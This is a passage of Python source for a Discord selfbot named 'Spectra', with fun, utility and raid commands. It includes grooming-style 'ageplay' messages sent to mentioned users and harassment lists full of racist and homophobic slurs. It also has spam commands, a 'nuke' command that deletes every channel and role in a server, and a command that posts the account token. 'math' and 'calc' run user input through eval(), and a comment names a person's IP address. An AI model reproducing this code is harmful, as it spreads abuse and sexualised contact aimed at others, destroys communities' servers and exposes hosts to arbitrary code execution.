        f"you look kinda cute ;)~ {member.mention}",
        f"would you like to ageplay...~ {member.mention}~",
        f"let's pretend we're someone else for a bit~ {member.mention}",
        f"you're doing great, {member.mention}... keep going~",
        f"hehe, you're so silly {member.mention}~",
        f"i like this little game... don't you, {member.mention}?",
        f"what should we play next, cutie?~",
        f"don't stop now... we're just getting started, {member.mention}~",
        f"shhh... it's just us here~ {member.mention}",
        f"how about... we pretend to be kids for a while?~ {member.mention}",
        f"i have some toys we can play with...~ {member.mention}",
        f"let's make this fun, {member.mention}~",
        f"i love playing with you, {member.mention}~",
        f"you're such a good little {member.mention}~",
        f"let's keep this between us, okay?~ {member.mention}",
        f"i have a secret...~ {member.mention}~",
        f"you're my special little {member.mention}~",
        f"i want to take care of you, {member.mention}~",
    ]

    for line in lines:
        if not is_ageplay_active:  
            await ctx.send("Ageplaying stopped.")
            break
        await asyncio.sleep(1)
        await ctx.send(line)

    is_ageplay_active = False  


@bot.command()
async def stopageplay(ctx):
    global is_ageplay_active

    if not is_ageplay_active:
        await ctx.send("No active ageplaying to stop.")
        return

    is_ageplay_active = False  
    await ctx.send("")




afk_sex_cum_alex_made =[]


afk_data = {
    "is_afk": False,
    "reason": "",
    "since": None,
    "whitelist": [],
    "afk_set_by": None
}

AFK_WHITELIST_LINES = {
    ":white_check_mark: {mention}: You're now AFK with the status:",
    "👋 {mention}, welcome back! You were AFK for",
    "💤 {mention} is AFK: "  
}

def is_whitelisted_afk_message(content, user_mention):
    for line in AFK_WHITELIST_LINES:
        if line.startswith(":white_check_mark"):
            if f":white_check_mark: {user_mention}:" in content:
                return True
        elif line.startswith("👋"):
            if f"👋 {user_mention}" in content and "welcome back!" in content:
                return True
        elif line.startswith("💤"):
            if f"💤 {user_mention}" in content and "is AFK:" in content:
                return True
    return False










#######################################################################################################################################################################################################


# fuckass massreact command requested by vodka failed again fuck im so mad fuck you vodka your ip is 132.54.05.6

# reacting = False
# react_channel_id = None
# react_emojis = []
# 
# @bot.command()
# async def massreact(ctx, channel_arg: str = None, *emojis):
#     """Begin mass reacting in a channel with provided emojis."""
#     global reacting, react_channel_id, react_emojis
# 
#     if not channel_arg:
#         await ctx.send("Usage: `,massreact <channel> <emoji1> <emoji2> ...`\nExample: `,massreact #general 😀 👍`")
#         return
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
# 
#
# 
#     if not emojis:
#         await ctx.send("[!] Provide at least one emoji.\nExample: `,massreact #general 😀 👍`")
#        return
# 
#     # Resolve the channel
#     channel = None
#     if channel_arg.startswith("<#") and channel_arg.endswith(">"):
#         try:
#             cid = int(channel_arg.strip("<#>"))
#             channel = bot.get_channel(cid)
#         except ValueError:
#             pass
#     elif channel_arg.isdigit():
#         channel = bot.get_channel(int(channel_arg))
#     else:
#         for ch in ctx.guild.text_channels:
#             if ch.name == channel_arg:
#                 channel = ch
#                 break
# 
#     if not channel:
#         await ctx.send("[!] Invalid channel. Use a mention, ID, or valid name.")
#         return
# 
#     # Set global variables for mass reacting
#     react_channel_id = channel.id
#     react_emojis = list(emojis)
#     reacting = True
# 
#     await ctx.message.delete()
#     await ctx.send(f"[+] Mass reacting in {channel.mention} with: {' '.join(react_emojis)}")
# 
# @bot.command()
# async def stopmassreact(ctx):
#     """Stop mass reacting."""
#     global reacting, react_channel_id, react_emojis
#     reacting = False
#     react_channel_id = None
#     react_emojis = []
#     await ctx.message.delete()
#     await ctx.send(":octagonal_sign: Stopped mass reacting.")
# 
# @bot.event
# async def on_message(message):
#     # Process commands first
#     await bot.process_commands(message)
# 
#     # Check if mass reacting is active
#     if not reacting:
#         return
# 
#     # Ignore the bot's own messages
#     if message.author.id == bot.user.id:
#         return
# 
#     # Check if the message is in the target channel
#     if message.channel.id != react_channel_id:
#         return
# 
#     # React to the message with the specified emojis
#     try:
#         for emoji in react_emojis:
#             await message.add_reaction(emoji)
#         print(f"[REACTED] To message from {message.author}: {message.content}")
#     except discord.HTTPException as e:
#         print(f"[❌ ERROR] Failed to react: {e}")
# 

#                 d8Pe                            #                 d8Pe                         #                               
#               d888888P                          #               d888888P                       #          
#   88bd8b,d88b   ?88'  ?88   d8P.d88b,.88P       #   88bd8b,d88b   ?88'  ?88   d8P.d88b,.88P    #          
#   88P'`?8P'?8b  88P   d88   88 88P  `88P'       #   88P'`?8P'?8b  88P   d88   88 88P  `88P'    #   
#  d88  d88  88P  88b   ?8(  d88 ?8b  d88         #  d88  d88  88P  88b   ?8(  d88 ?8b  d88      #         
# d88' d88'  88b  `?8b  `?88P'?8b`?888888         # d88' d88'  88b  `?8b  `?88P'?8b`?888888      #      
#                                    `?88         #                                    `?88      #           
#                                      88b        #                                      88b     #         
#                                      ?8P        #                                      ?8P     #       
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work # 
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work #
# this shit above doesnt work # 

# USE THIS AT YOUR OWN RISK. THIS COMMAND BELOW "showtoken" WILL SHOW YOUR TOKEN IN THE DISCORD CHAT.
# USE THIS AT YOUR OWN RISK. THIS COMMAND BELOW "showtoken" WILL SHOW YOUR TOKEN IN THE DISCORD CHAT.
# USE THIS AT YOUR OWN RISK. THIS COMMAND BELOW "showtoken" WILL SHOW YOUR TOKEN IN THE DISCORD CHAT.
# USE THIS AT YOUR OWN RISK. THIS COMMAND BELOW "showtoken" WILL SHOW YOUR TOKEN IN THE DISCORD CHAT.
# USE THIS AT YOUR OWN RISK. THIS COMMAND BELOW "showtoken" WILL SHOW YOUR TOKEN IN THE DISCORD CHAT.
# USE THIS AT YOUR OWN RISK. THIS COMMAND BELOW "showtoken" WILL SHOW YOUR TOKEN IN THE DISCORD CHAT.

@bot.command()
async def showtoken(ctx):
    await ctx.send(f"```{bot.http.token}```")


# USE THIS AT YOUR OWN RISK. THIS COMMAND ABOVE "showtoken" WILL SHOW YOUR TOKEN IN THE DISCORD CHAT.
# USE THIS AT YOUR OWN RISK. THIS COMMAND ABOVE "showtoken" WILL SHOW YOUR TOKEN IN THE DISCORD CHAT.
# USE THIS AT YOUR OWN RISK. THIS COMMAND ABOVE "showtoken" WILL SHOW YOUR TOKEN IN THE DISCORD CHAT.
# USE THIS AT YOUR OWN RISK. THIS COMMAND ABOVE "showtoken" WILL SHOW YOUR TOKEN IN THE DISCORD CHAT.
# USE THIS AT YOUR OWN RISK. THIS COMMAND ABOVE "showtoken" WILL SHOW YOUR TOKEN IN THE DISCORD CHAT.
# USE THIS AT YOUR OWN RISK. THIS COMMAND ABOVE "showtoken" WILL SHOW YOUR TOKEN IN THE DISCORD CHAT.


import discord
from discord.ext import commands
import random
import json
import os

kiss_file = "kiss_data.json"
kiss_counts = {}

kiss_gifs = [
    "https://nekos.best/api/v2/kiss/cfde096f-37ae-4ad2-8371-d0dd33710f8e.gif",
    "https://nekos.best/api/v2/kiss/99e10428-a7cf-4037-9fc2-0b24b190c2ed.gif",
    "https://nekos.best/api/v2/kiss/2a4527e5-a123-43aa-ac09-ba6fda2a3985.gif",
    "https://nekos.best/api/v2/kiss/1bd3a817-bb88-4a08-8c95-97a1793f86d2.gif",
    "https://nekos.best/api/v2/kiss/ff5b70d7-f3c5-4c90-b10c-69c2ea1d90c5.gif",
    "https://nekos.best/api/v2/kiss/fcc26655-b606-477f-948a-7fae5435a4e1.gif",
    "https://nekos.best/api/v2/kiss/cfde096f-37ae-4ad2-8371-d0dd33710f8e.gif",
    "https://nekos.best/api/v2/kiss/17c77bfb-7b16-4bd9-b5de-e00bd8bc229a.gif",
    "https://tenor.com/view/zm-kiss-make-out-couple-love-gif-15416619",
    "https://tenor.com/view/mst-gif-26437561",
    "https://tenor.com/view/yosuga-no-sora-kiss-sora-and-haru-sora-x-haru-yosuga-no-sora-kiss-gif-2058923904916569152",
    "https://tenor.com/view/romance-gif-14669209222310596068",
    "https://tenor.com/view/merijn-gif-6786910630020236997",
    "https://tenor.com/view/anime-kiss-anime-kiss-kiss-gif-cute-kiss-gif-9501930508666646141",
    "https://tenor.com/view/usui-misa-anime-kiss-gif-3808415718451535541",
    "https://tenor.com/view/horimiya-animes-anime-shoujo-shounen-romance-boy-girl-gif-17793070781933240295",
    "https://nekos.best/api/v2/kiss/b0a0d6f8-129a-46b7-9824-4b9a35723f18.gif",
    "https://nekos.best/api/v2/kiss/5a0e8e01-8992-4b7a-91ed-2bbf3ac7e5b9.gif",
    "https://nekos.best/api/v2/kiss/54baecd4-6959-4cb0-9dda-abbf3d55450b.gif",
    "https://nekos.best/api/v2/kiss/c2f81599-98de-41b5-bcb9-c2bc7c7f6542.gif",
    "https://nekos.best/api/v2/kiss/ac3013be-2c19-44b5-9b89-58cff9d96805.gif",
    "https://nekos.best/api/v2/kiss/650d229e-5ddc-48d5-9868-63c6e4bcb1d7.gif",
    "https://cdn.discordapp.com/attachments/1373337330450170090/1373407686040879104/kiss.gif?ex=682a4d15&is=6828fb95&hm=8bf3bec7e6fc0482fd25ac33c07ef3cf5ed9e3f02ef241923a507941da5403c2&",
    "https://cdn.discordapp.com/attachments/1373337330450170090/1373407647218270258/kiss.gif?ex=682a4d0b&is=6828fb8b&hm=6e9637e5d8d0c4be07c7bbd37d02d658ee29462242aea2267729674e8c9f6181&",
    "https://cdn.discordapp.com/attachments/1373337330450170090/1373407845277630555/kiss.gif?ex=682a4d3a&is=6828fbba&hm=c061e154d45f9f02e713ea71e216e7a8d6614c7d3961f2b956075d5dfb51718b&",
    "https://cdn.discordapp.com/attachments/1373337330450170090/1373407834787811429/kiss.gif?ex=682a4d38&is=6828fbb8&hm=2566746c08a8b180459dc4fc0f5ee5795810c5b80c41b1f3a6405a813cc9ec90&",
    "https://cdn.discordapp.com/attachments/1373337330450170090/1373407976575991828/kiss.gif?ex=682a4d5a&is=6828fbda&hm=53d64cc11ee08c53aee58cae87a6e759266bb96820fc11f6f6f065465933a784&",
    "https://cdn.discordapp.com/attachments/1373337330450170090/1373408018267508768/kiss.gif?ex=682a4d64&is=6828fbe4&hm=5b578d0daab7d19716cecea2a713b751a9bcbf22db756ae148721ae506799139&",
    "https://cdn.discordapp.com/attachments/1373337330450170090/1373408335126200363/kiss.gif?ex=682a4daf&is=6828fc2f&hm=633deb451f8ddbeb490e7ea40abaaa51f3a2a080f1d9d9c32b9cc48177a79ea5&"

]

@bot.command()
async def kiss(ctx, user: discord.User = None):
    global kiss_counts

    if not os.path.exists(kiss_file):
        await ctx.send("⚠️ **No Json File Found... Creating.**\n*You may try again now.*")
        with open(kiss_file, 'w') as f:
            json.dump({}, f, indent=4)
        kiss_counts = {}
        return

    if user is None:
        await ctx.send("You need to mention someone to kiss idiot.")
        return
    if user.id == ctx.author.id:
        await ctx.send("You can't kiss yourself gang :sob:")
        return

    with open(kiss_file, 'r') as f:
        kiss_counts = json.load(f)

    pair_key = f"{ctx.author.id}_{user.id}"
    kiss_counts[pair_key] = kiss_counts.get(pair_key, 0) + 1
    count = kiss_counts[pair_key]

    with open(kiss_file, 'w') as f:
        json.dump(kiss_counts, f, indent=4)

    gif_url = random.choice(kiss_gifs)
    await ctx.send(f"**{ctx.author.mention} has kissed {user.mention} {count} times!**\n{gif_url}")

@bot.command()
async def testing(ctx):
    await ctx.send(f"```test passed.```") 


@bot.command()
async def kisscount(ctx, user: discord.User = None):
    if user is None:
        await ctx.send("❌ Usage: `,kisscount @user`")
        return

    pair_key = f"{ctx.author.id}_{user.id}"
    count = kiss_counts.get(pair_key, 0)
    await ctx.send(f"💋 You have kissed {user.name} **{count}** times.")


import json
import os
from datetime import datetime
from discord.ext import commands
from winotify import Notification

BIRTHDAY_FILE = "bday_config.json"

def save_birthday(user_id, bday_str):
    if os.path.exists(BIRTHDAY_FILE):
        with open(BIRTHDAY_FILE, "r") as f:
            data = json.load(f)
    else:
        data = {}

    data[str(user_id)] = bday_str
    with open(BIRTHDAY_FILE, "w") as f:
        json.dump(data, f)

def load_birthday(user_id):
    if os.path.exists(BIRTHDAY_FILE):
        with open(BIRTHDAY_FILE, "r") as f:
            data = json.load(f)
            return data.get(str(user_id))
    return None

def show_birthday_set_notification(username, birthday):
    Notification(
        app_id="Spectra",
        title="Birthday Set",
        msg=f"{username} I have set your Birthday to {birthday}",
    ).show()

@bot.command()
async def bday(ctx, *, arg=None):
    user_id = ctx.author.id
    username = ctx.author.name

    if arg and arg.lower().startswith("set "):
        raw_input = arg[4:].strip()
        try:
            parsed_date = datetime.strptime(raw_input, "%B %d")
            bday_str = parsed_date.strftime("%m-%d")  
            save_birthday(user_id, bday_str)
            show_birthday_set_notification(username, parsed_date.strftime("%B %d"))
            await ctx.send(f"[+] Birthday set to `{parsed_date.strftime('%B %d')}`.")
        except ValueError:
            await ctx.send("[-] Invalid format. Use month and day, like `May 18` or `March 9`.")
        return

    elif arg and arg.lower() == "remove":
        if os.path.exists(BIRTHDAY_FILE):
            with open(BIRTHDAY_FILE, "r") as f:
                data = json.load(f)
            if str(user_id) in data:
                del data[str(user_id)]
                with open(BIRTHDAY_FILE, "w") as f:
                    json.dump(data, f)
                await ctx.send("[*] Birthday removed.")
            else:
                await ctx.send("[!] No birthday set to remove.")
        else:
            await ctx.send("[!] No birthday set.")
        return

    bday_str = load_birthday(user_id)
    if not bday_str:
        await ctx.send("[!] No birthday set. Use `,bday set March 9`.")
        return

    today = datetime.now()
    this_year = today.year
    bday_date = datetime.strptime(f"{this_year}-{bday_str}", "%Y-%m-%d")

    if today.month == bday_date.month and today.day == bday_date.day:
        await ctx.send(f"📆 {ctx.author.mention}: Its your Birthday Today! Happy Birthday!")
        return

    if bday_date < today:
        bday_date = bday_date.replace(year=this_year + 1)

    delta = bday_date - today
    days = delta.days
    hours = delta.seconds // 3600
    minutes = (delta.seconds % 3600) // 60

    display_date = datetime.strptime(bday_str, "%m-%d").strftime("%B %d")

    await ctx.send(f"🎂 {ctx.author.mention}: Your birthday is `{display_date}`. That's in `{days} days, {hours} hours, {minutes} minutes`!")

import discord
from discord.ext import commands
import random
import json
import os

fuck_file = "fuck_data.json"
fuck_counts = {}

fuck_gifs = [
    "https://cdn.discordapp.com/attachments/1366437049137365064/1372138919637946368/NOE2Fxy.gif?ex=6825af73&is=68245df3&hm=b521ebe675ce5e026017ae23551b7d46f130c98e87996a0985294619f7177094&",
    "https://cdn.discordapp.com/attachments/1366437049137365064/1372138979079487569/3yycYSr.gif?ex=6825af81&is=68245e01&hm=a8b7c024c5e85ea5dda4047179e52c684ffa3e660b0b24b6f197425341f05435&",
    "https://cdn.discordapp.com/attachments/1366437049137365064/1372139207824506930/nE96v3t.gif?ex=6825afb8&is=68245e38&hm=fbb5e1b3e36d457bbe2cf048a42ecd979af7fe7c7dd6c3a4b86ab71868df5612&",
    "https://cdn.discordapp.com/attachments/1366437049137365064/1372139198840045628/F6JUZDa.gif?ex=6825afb6&is=68245e36&hm=0b869b392c059035c1fa080148234d67e59a6294a986f824361287c97f475bce&",
    "https://cdn.discordapp.com/attachments/1366437049137365064/1372139183736492082/TAruezL.gif?ex=6825afb2&is=68245e32&hm=aa7a5549f6607e2fded511e91ba9fef695a2cc5d4d1b4e66293d33f3c5477862&",
    "https://cdn.discordapp.com/attachments/1366437049137365064/1372139156356071424/YQX3wOL.gif?ex=6825afab&is=68245e2b&hm=fb713ed99526194451418e03158c9d71e00a528a3532fed777d404eeacbc639d&"

]

@bot.command()
async def fuck(ctx, user: discord.User = None):
    global fuck_counts

    if not os.path.exists(fuck_file):
        await ctx.send("⚠️ **No Json File Found... Creating.**\n*You may try again now.*")
        with open(fuck_file, 'w') as f:
            json.dump({}, f, indent=4)
        fuck_counts = {}
        return

    if user is None:
        await ctx.send("You need to mention someone to fuck idiot.")
        return
    if user.id == ctx.author.id:
        await ctx.send("You can't fuck yourself gang :sob:")
        return

    with open(fuck_file, 'r') as f:
        fuck_counts = json.load(f)

    pair_key = f"{ctx.author.id}_{user.id}"
    fuck_counts[pair_key] = fuck_counts.get(pair_key, 0) + 1
    count = fuck_counts[pair_key]

    with open(fuck_file, 'w') as f:
        json.dump(fuck_counts, f, indent=4)

    gif_url = random.choice(fuck_gifs)
    await ctx.send(f"**{ctx.author.mention} fucked {user.mention} {count} times!**\n{gif_url}")



import random

@bot.command()
async def clown(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("Clown this ni⁣gg⁣a. Usage: ,clown @ni⁣gg⁣er⁣s")
        return

    async for msg in ctx.channel.history(limit=50):
        if msg.author == member:
            try:
                await msg.add_reaction("🤡")
            except discord.Forbidden:
                await ctx.send("I don't have permission to react to messages.")
            break

    clown_lines = [
        f"{member.mention} u a fatherless, friendless, and brainless little ni⁣gg⁣a :joy:",
        f"{member.mention} ni⁣gg⁣a got dropped by their dad harder than a SoundCloud single",
        f"{member.mention} talkin wild for someone whose mom moa⁣ns my name on vc :pray:",
        f"{member.mention} u the type to bark in group chats and fold irl",
        f"{member.mention} this ni⁣gg⁣a built like expired cu⁣m ong",
        f"{member.mention} everytime this ni⁣gg⁣a type his dad leaves again :sob:",
        f"{member.mention} is the reason why ab⁣or⁣tio⁣n was invented",
        f"{member.mention} this ni⁣gg⁣a the type of ni⁣gg⁣a to get ghosted by his parents",
        f"{member.mention} no dad no drip no bi⁣tch⁣es no reason to talk :sob:",
        f"{member.mention} be quiet lil ni⁣gg⁣a :sob:",
        f"{member.mention} how this n⁣ig⁣ga talkin in my presence skull",
        f"{member.mention} your opinion ain't valid go find your dad bro :sob:",
        f"{member.mention} speakin loud for someone who gets ghosted by their imaginary parents sob",
        f"{member.mention} you the reason your mom cries in silence bro :sob:",
        f"{member.mention} this ni⁣gg⁣a got WiFi from a gas station and still tryna talk lmfao",
        f"{member.mention} yo whole bloodline been takin Ls since birth :sob:",
        f"{member.mention} you speakin like your dad didnt disappear after the ultrasound :pray:",
        f"{member.mention} I dont talk to background characters ni⁣gg⁣a",
        f"{member.mention} this ni⁣gg⁣a gets disrespected by autocorrect :sob:",
        f"{member.mention} your ancestors weep every time you open your mouth :sob: :sob:",
        f"{member.mention} talkin bold for someone whose mom shaped like a va⁣pe :skull_crossbones:",
        f"{member.mention} n⁣igg⁣a you built like a rejected gta npc :sob:",
        f"{member.mention} Ive seen npcs smarter than this ni⁣gg⁣a",
        f"{member.mention} don't speak unless summoned peasant",
        f"{member.mention} your mom shouldve swallowed you and saved us a headache :sob:"
    ]


    for _ in range(5):
        await ctx.send(random.choice(clown_lines))
        await asyncio.sleep(0.4)  



@bot.command()
async def oclown(ctx, member: discord.Member = None):
    if member is None:
        await ctx.send("Clown this ni⁣gg⁣a. Usage: ,oclown @ni⁣gg⁣er⁣s")
        return

    async for msg in ctx.channel.history(limit=50):
        if msg.author == member:
            try:
                await msg.add_reaction("🤡")
            except discord.Forbidden:
                await ctx.send("I don't have permission to react to messages.")
            break

    oclown_lines = [
        f"{member.mention} u a fatherless, friendless, and brainless little ni⁣gg⁣a :joy:",
        f"{member.mention} ni⁣gg⁣a got dropped by their dad harder than a SoundCloud single",
        f"{member.mention} talkin wild for someone whose mom moa⁣ns my name on vc :pray:",
        f"{member.mention} u the type to bark in group chats and fold irl",
        f"{member.mention} this ni⁣gg⁣a built like expired cu⁣m ong",
        f"{member.mention} everytime this ni⁣gg⁣a type his dad leaves again :sob:",
        f"{member.mention} is the reason why ab⁣or⁣tio⁣n was invented",
        f"{member.mention} this ni⁣gg⁣a the type of ni⁣gg⁣a to get ghosted by his parents",
        f"{member.mention} no dad no drip no bi⁣tch⁣es no reason to talk :sob:",
        f"{member.mention} be quiet lil ni⁣gg⁣a :sob:",
        f"{member.mention} how this n⁣ig⁣ga talkin in my presence skull",
        f"{member.mention} your opinion ain't valid go find your dad bro :sob:",
        f"{member.mention} speakin loud for someone who gets ghosted by their imaginary parents sob",
        f"{member.mention} you the reason your mom cries in silence bro :sob:",
        f"{member.mention} this ni⁣gg⁣a got WiFi from a gas station and still tryna talk lmfao",
        f"{member.mention} yo whole bloodline been takin Ls since birth :sob:",
        f"{member.mention} you speakin like your dad didnt disappear after the ultrasound :pray:",
        f"{member.mention} I dont talk to background characters ni⁣gg⁣a",
        f"{member.mention} this ni⁣gg⁣a gets disrespected by autocorrect :sob:",
        f"{member.mention} your ancestors weep every time you open your mouth :sob: :sob:",
        f"{member.mention} talkin bold for someone whose mom shaped like a va⁣pe :skull_crossbones:",
        f"{member.mention} n⁣igg⁣a you built like a rejected gta npc :sob:",
        f"{member.mention} Ive seen npcs smarter than this ni⁣gg⁣a",
        f"{member.mention} don't speak unless summoned peasant",
        f"{member.mention} your mom shouldve swallowed you and saved us a headache :sob:"
    ]

    await ctx.send(random.choice(oclown_lines))


@bot.command()
async def end(ctx, member: discord.Member = None):
    await ctx.message.delete()  
    if member is None:
        await ctx.send("```,end @user```")
        return

    await ctx.send(f"u got ended by spectra ni⁣gg⁣a {member.mention} https://discord.gg/MpRzUns8AC")

@bot.command()
async def creator(ctx):
    await ctx.message.delete()
    await ctx.send(f"<@1363259589092446279> ; @wissssssssssss is the original creator of this selfbot. want one? join https://discord.gg/MpRzUns8AC {ctx.author.mention}.")


@bot.command()
async def advertise(ctx):
    await ctx.send(f"@everyone join spectras only discord server https://discord.gg/MpRzUns8AC")
    time.sleep(1)
    await ctx.send(f"spectra ended you https://discord.gg/MpRzUns8AC")
    time.sleep(0.1) 
    await ctx.send(f"spectra selfbot here: https://discord.gg/MpRzUns8AC")

import os
import re

@bot.command()
async def commandcount(ctx):
    await ctx.message.delete()
    await ctx.send(f"Spectra contains **210** commands.")

# REMINDERS_FILE = "reminders.json"

# Load reminders or create empty list
# if os.path.isfile(REMINDERS_FILE):
#    with open(REMINDERS_FILE, "r") as f:
#        reminders = json.load(f)
# else:
#     reminders = []

# def save_reminders():
#    with open(REMINDERS_FILE, "w") as f:
#        json.dump(reminders, f, indent=4)

# def parse_time_string(time_str):
#    units = {
#       "second": 1, "seconds": 1, "sec": 1, "s": 1,
#        "minute": 60, "minutes": 60, "min": 60, "m": 60,
#        "hour": 3600, "hours": 3600, "h": 3600,
#        "day": 86400, "days": 86400, "d": 86400
#    }
#    parts = time_str.lower().strip().split()
#    if len(parts) != 2:
#        return None
#    try:
#        amount = int(parts[0])
#        unit = parts[1]
#        if unit not in units:
#            return None
#        return timedelta(seconds=amount * units[unit]) 
#    except:
#        return None

# @bot.command()
# async def reminder(ctx, action=None, *, args=None):
#    if action != "set" or not args:
#       await ctx.send("[-] Usage: `,reminder set <message> <time>`\nExample: `,reminder set my birthday 30 minutes`")
#       return
#
#   # Split args so last two words = time, rest = message
#    parts = args.rsplit(" ", 2)
#    if len(parts) < 2:
#        await ctx.send("[-] Please provide a reminder message and time.\nExample: `,reminder set my birthday 30 minutes`")
#        return
#
#    *message_parts, time_amount, time_unit = parts
#    message = " ".join(message_parts).strip()
#    time_str = f"{time_amount} {time_unit}"

#    delta = parse_time_string(time_str)
#    if delta is None:
#        await ctx.send("[-] Invalid time format. Use like `30 seconds`, `10 minutes`, `2 hours`, or `1 day`.")
#        return
#
#    remind_time = datetime.utcnow() + delta
#    reminders.append({
#        "user_id": ctx.author.id,
#        "channel_id": ctx.channel.id,
#        "message": message,
#       "time": remind_time.isoformat()
#    })
#    save_reminders()
#
#    await ctx.send(f"[+] Reminder set! I'll remind you about: `{message}` in {time_str}.")

# @tasks.loop(seconds=30)
# async def check_reminders():
#   now = datetime.utcnow()
#    to_remove = []
#
#    for r in reminders:
#        remind_time = datetime.fromisoformat(r["time"])
#        if now >= remind_time:
#            user = bot.get_user(r["user_id"])
#            channel = bot.get_channel(r["channel_id"])
#           if channel:
#                try:
#                    await channel.send(f"[REMINDER] {user.mention if user else ''} {r['message']}")
#                    print(f"[REMINDER] Sent reminder to {user} in {channel}: {r['message']}")
#                except Exception as e:
#                    print(f"[ERROR] Couldn't send reminder: {e}")
#            to_remove.append(r)
#
#    if to_remove:
#        for r in to_remove:
#            reminders.remove(r)
#        save_reminders()

@bot.command()
async def reminder(ctx, sec: int, *, msg):
    await ctx.send(f"I’ll remind you in `{sec}` seconds...")
    await asyncio.sleep(sec)
    await ctx.send(f"Reminder: {msg}")

@bot.command()
async def convert(ctx, num: int):
    binary = bin(num)
    hexa = hex(num)
    await ctx.send(f"`{num}` in binary: `{binary}` | hex: `{hexa}`")




@bot.command()
async def math(ctx, *, expr):
    try:
        result = eval(expr)
        await ctx.send(f"Results: `{result}`")
    except:
        await ctx.send("Invalid math expression.")    

@bot.command()
async def calc(ctx, *, expr):
    try:
        result = eval(expr)
        await ctx.send(f"➕ {expr} = `{result}`")
    except:
        await ctx.send("cant calculate that cause im a ret⁣ard.")

@bot.command()
async def echo(ctx, *, text):
    await ctx.send(f" {text}")

@bot.command()
async def bored(ctx):
    suggestions = [
        "Get off discord ni⁣gg⁣a.",
        "Join Spectra's Selfbot Server",
        "Learn how to code.",
        "Get the fuck up",
        "Nuke a server (for research purposes).",
        "Not be a fa⁣gg⁣ot"
    ]
    await ctx.send(f"Bored? Try this:\n> {random.choice(suggestions)}")

@bot.command()
async def countdown(ctx, sec: int):
    await ctx.send(f"counter started: `{sec}` seconds")
    for i in range(sec, 0, -1):
        await ctx.send(f"`{i}`")
        await asyncio.sleep(1)
    await ctx.send("gg times up twin")

@bot.command()
async def spongebob(ctx, *, text):
    mocked = ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(text))
    await ctx.send(mocked)

@bot.command()
async def emojiflood(ctx, emoji):
    await ctx.send("emoji flood...")
    try:
        for _ in range(5):
            await ctx.send(" ".join([emoji] * 20))
            await asyncio.sleep(0.3)
        await ctx.send("flood done.")
    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command()
async def scrollping(ctx, user: discord.User):
    try:
        for _ in range(5):
            await ctx.send(f"{user.mention}\n" * 10)
            await asyncio.sleep(0.5)
        await ctx.send("scroll ended.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def wave(ctx, user: discord.User):
    wave = ["🌊", "🌊🌊", "🌊🌊🌊", "🌊🌊", "🌊"]
    for frame in wave:
        await ctx.send(f"{user.mention} {frame}")
        await asyncio.sleep(0.3)

@bot.command()
async def bomb(ctx, user: discord.User):
    stages = ["💣", "💣", "💥", "☠️"]
    for stage in stages:
        await ctx.send(f"{user.mention} {stage}")
        await asyncio.sleep(0.5)

@bot.command()
async def fireworks(ctx, user: discord.User):
    colors = ["🎆", "🎇", "✨", "🔥"]
    for _ in range(8):
        await ctx.send(f"{user.mention} {random.choice(colors)}")
        await asyncio.sleep(0.2)

@bot.command()
async def matrix(ctx):
    symbols = ['1', '0', '░', '▓', '█', '▌', '▐']
    for _ in range(10):
        line = ''.join(random.choice(symbols) for _ in range(40))
        await ctx.send(f"`{line}`")
        await asyncio.sleep(0.2)

@bot.command()
async def rainbowtext(ctx, *, msg):
    colors = ["🟥", "🟧", "🟨", "🟩", "🟦", "🟪"]
    result = ""
    for i, c in enumerate(msg):
        result += f"{colors[i % len(colors)]}{c}"
    await ctx.send(result)

@bot.command()
async def scrollingtext(ctx, *, text):
    await ctx.send("Scrolling message:")
    for i in range(len(text)):
        await ctx.send(text[i:] + " " + text[:i])
        await asyncio.sleep(0.2)

@bot.command()
async def reverse(ctx, *, text):
    await ctx.send(text[::-1])

@bot.command()
async def bold(ctx, *, text):
    await ctx.send(f"**{text}**")

@bot.command()
async def italic(ctx, *, text):
    await ctx.send(f"*{text}*")

@bot.command()
async def underline(ctx, *, text):
    await ctx.send(f"__{text}__")

@bot.command()
async def strikethrough(ctx, *, text):
    await ctx.send(f"~~{text}~~")

@bot.command()
async def spoiler(ctx, *, text):
    await ctx.send(f"||{text}||")

@bot.command()
async def zalgify(ctx, *, text):
    zalgo_chars = [chr(x) for x in range(0x0300, 0x036F)]
    result = ''
    for c in text:
        result += c + ''.join(random.choices(zalgo_chars, k=random.randint(1, 3)))
    await ctx.send(result)

@bot.command()
async def cursive(ctx, *, text):
    base = ord('a')
    fancy = [chr(0x1D4B6 + (ord(c.lower()) - base)) if c.isalpha() else c for c in text]
    await ctx.send("".join(fancy))

@bot.command()
async def tinytext(ctx, *, text):
    normal = 'abcdefghijklmnopqrstuvwxyz'
    tiny = 'ᵃᵇᶜᵈᵉᶠᵍʰᶦʲᵏˡᵐⁿᵒᵖᑫʳˢᵗᵘᵛʷˣʸᶻ'
    result = ''
    for c in text.lower():
        if c in normal:
            result += tiny[normal.index(c)]
        else:
            result += c
    await ctx.send(result)


@bot.command()
async def nuke(ctx):
    await ctx.send("spectra is now nuking this server...")
    try:
        for ch in ctx.guild.channels:
            try:
                await ch.delete()
                await asyncio.sleep(0.3)
            except: pass
        for r in ctx.guild.roles:
            try:
                await r.delete()
                await asyncio.sleep(0.3)
            except: pass
        for i in range(10):
            await ctx.guild.create_text_channel(f"spectra-selfbot-{random.randint(100,999)}")
        await ctx.send("spectra nuke finished.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def spamchannels(ctx, *, name="spectra-runs-you"):
    await ctx.send(f"spectra is now spamming channels with name: `{name}`")
    try:
        for _ in range(20):
            await ctx.guild.create_text_channel(name)
            await asyncio.sleep(0.2)
        await ctx.send("done twin")
    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command()
async def spamroles(ctx, *, name="spectra was here https://discord.gg/taS5TaryCy"):
    await ctx.send(f"spamming all roles: `{name}`")
    try:
        for _ in range(20):
            await ctx.guild.create_role(name=name)
